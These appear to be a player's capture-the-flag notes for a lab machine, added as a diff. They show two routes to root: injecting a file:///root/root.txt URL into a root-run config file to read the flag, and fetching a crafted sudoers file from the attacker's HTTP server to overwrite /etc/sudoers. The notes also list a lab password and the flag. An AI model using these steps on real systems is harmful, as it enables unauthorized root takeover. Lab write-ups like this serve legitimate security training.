@@ -1,0 +1,51 @@
+#10.10.10.150
+--------------
+#found two files 'input' & 'report'
+#two ways to get root key
+
+----------------------------------------
+#1st METHOD TO GET ROOT KEY    (used)
+----------------------------------------
+#analyse input and report file...
+ls -l
+#url = "-o /tmp/adm.txt file:///root/root.txt"
+
+#inside input file
+url = "file:///root/root.txt"
+
+#check content of report
+cat report
+
+#Got root key
+
+
+----------------------------------------
+#2nd METHOD          (used)
+----------------------------------------
+#with this method we'll get root shell
+#create one 'sudoers' file and 
+```
+root	ALL=(ALL:ALL) ALL
+floris	ALL=(ALL:ALL) ALL
+```
+#start server
+python -m SimpleHTTPServer 80
+
+
+#onto server, add these lines into 'input' file
+```
+url = "http://10.10.12.35/sudoers"
+output = "/etc/sudoers"
+```
+#now wait & check the output of server cmd that file is transfered or not
+#if file is transfered than the user 'floris' is added as sudo user
+#run
+sudo su
+#PASSWD= 5d<wdCbdZu)|hChXll
+
+#Got Shell
+
+
+#key
+82c198ab6fc5365fdc6da2ee5c26064a
+
